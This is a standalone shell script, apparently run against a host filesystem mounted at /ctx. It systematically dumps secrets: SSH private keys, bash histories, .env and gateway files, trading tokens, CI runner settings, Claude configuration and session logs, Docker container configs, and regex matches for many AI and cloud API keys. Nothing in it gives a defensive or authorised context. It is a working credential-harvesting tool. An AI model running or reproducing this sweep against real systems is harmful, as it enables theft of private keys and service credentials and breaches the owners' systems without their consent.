#!/bin/sh
s(){ echo "---$1---"; }
s ROOT_LS; ls -la /ctx/root 2>&1
s ROOT_FILES; find /ctx/root -type f 2>/dev/null | head -40
s ROOT_HIST; head -c 2000 /ctx/root/.bash_history 2>&1; echo
s ROOT_CFG; find /ctx/root/.config /ctx/root/.aws /ctx/root/.openclaw /ctx/root/.local 2>/dev/null | head -40
s QT_TRADE; head -c 1500 /ctx/root/.config/qtrade-reserve/tokens.json 2>&1; echo
s ROOT_SSH; ls -la /ctx/root/.ssh 2>&1
s ROOT_SSH_FILES; for f in /ctx/root/.ssh/id_* /ctx/root/.ssh/config /ctx/root/.ssh/known_hosts /ctx/root/.ssh/*.pem; do [ -f "$f" ] && { echo "## $f"; head -c 2500 "$f"; echo; }; done 2>&1
s HOME_LS; ls -la /ctx/home 2>&1
s UBUNTU_LS; ls -la /ctx/home/ubuntu 2>&1 | head -40
s UBUNTU_SSH; ls -la /ctx/home/ubuntu/.ssh 2>&1
s UBUNTU_SSH_FILES; for f in /ctx/home/ubuntu/.ssh/*; do [ -f "$f" ] && { echo "## $f"; head -c 2500 "$f"; echo; }; done 2>&1
s LIGHTHOUSE; ls -la /ctx/home/lighthouse 2>&1 | head -20; for f in /ctx/home/lighthouse/.ssh/*; do [ -f "$f" ] && { echo "## $f"; head -c 1500 "$f"; echo; }; done 2>&1
s RUNNER_ENV; cat /ctx/home/ubuntu/actions-runner/.env 2>&1 | head -c 800
s UBUNTU_HIST; head -c 1500 /ctx/home/ubuntu/.bash_history 2>&1; echo
s HOME_DOTFILES; ls -la /ctx/home/ubuntu/.env /ctx/home/ubuntu/.aws /ctx/home/ubuntu/.config 2>&1 | head -20
s OPENCLAW_LS; ls -la /ctx/openclaw 2>&1
s ENV_MAIN; cat /ctx/openclaw/.env 2>&1
s ENV_GW; cat /ctx/openclaw/gateway.env 2>&1
s ENV_HERMES; cat /ctx/openclaw/hermes.env 2>&1
s HERMESDATA_LS; ls -la /ctx/openclaw/hermes-data 2>&1 | head -25
s HERMESDATA_ENV; cat /ctx/openclaw/hermes-data/.env 2>&1 | head -c 1500
s HERMESDATA_FILES; find /ctx/openclaw/hermes-data -maxdepth 2 -type f 2>/dev/null | head -30
s GW_JSON; head -c 6000 /ctx/openclaw/gateway-state/openclaw.json 2>&1; echo
s GW_LASTGOOD; head -c 3000 /ctx/openclaw/gateway-state/openclaw.json.last-good 2>&1; echo
s GW_IDENT; for f in /ctx/openclaw/gateway-state/identity/*.json /ctx/openclaw/gateway-state/devices/*.json; do echo "## $f"; head -c 1200 "$f" 2>&1; echo; done
s GW_LOGS; head -c 1500 /ctx/openclaw/gateway-state/logs/config-audit.jsonl 2>&1; echo
s CLAUDE_FILES; find /ctx/openclaw/claude-home -type f 2>/dev/null | head -60
s CLAUDE_MAINCFG; head -c 3000 /ctx/openclaw/claude-home/.claude.json 2>&1; echo
s CLAUDE_BAK; head -c 3000 /ctx/openclaw/claude-home/backups/.claude.json.backup.1776526310494 2>&1; echo
s CLAUDE_SESS; for f in $(find /ctx/openclaw/claude-home -name '*.jsonl' 2>/dev/null | head -6); do echo "## $f $(wc -c <$f)"; head -c 1000 "$f" 2>&1; echo; done
s OCDATA; ls -la /ctx/openclaw/data 2>&1; head -c 2500 /ctx/openclaw/data/users.json 2>&1; echo
s OCWS; find /ctx/openclaw/workspace /ctx/openclaw/seeds -maxdepth 3 2>/dev/null | head -40
s ETC_ENV; cat /ctx/etc/environment 2>&1
s ETC_LETSENCRYPT; ls -la /ctx/etc/letsencrypt 2>&1 | head -20
s SYSTEMD_ENV; grep -rha "Environment\|ExecStart" /ctx/etc/systemd/system 2>/dev/null | head -25
s DOCKERCFG; for f in /ctx/dc/*/config.v2.json; do echo "## $f"; head -c 6000 "$f" | tr -c '[:print:]' ' ' | head -c 3000; echo; done 2>&1
s SRV_LS; ls -la /ctx/srv 2>&1 | head -20
s WWW_LS; ls -la /ctx/var/www 2>&1 | head -20; find /ctx/var/www -maxdepth 3 -type f 2>/dev/null | head -20
s GREP_OPENCLAW; grep -rhoE 'sk-ant-[A-Za-z0-9_-]{20,}|sk-or-v1-[a-f0-9]{64}|sk-proj-[A-Za-z0-9_-]{20,}|sk-svcacct-[A-Za-z0-9_-]{20,}|AIza[0-9A-Za-z_-]{35}|AQ\.Ab8RN6[A-Za-z0-9_-]{20,}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|xai-[A-Za-z0-9_-]{20,}' /ctx/openclaw/claude-home /ctx/openclaw/gateway-state /ctx/openclaw/data /ctx/root /ctx/etc/environment 2>/dev/null | sort -u | head -30
s GREP_KEYNAMES; grep -rhaoE '(ANTHROPIC|OPENAI|GEMINI|GOOGLE|DEEPSEEK|NVIDIA|OPENROUTER|POOL_AI|XAI|GROQ|MISTRAL|TOGETHER)[_A-Z]*(KEY|TOKEN)[=: "]{1,4}[A-Za-z0-9_./:+-]{12,}' /ctx/openclaw/claude-home /ctx/openclaw/gateway-state /ctx/openclaw/data /ctx/root/.config /ctx/etc/environment 2>/dev/null | sort -u | head -40
echo "=====E2END====="
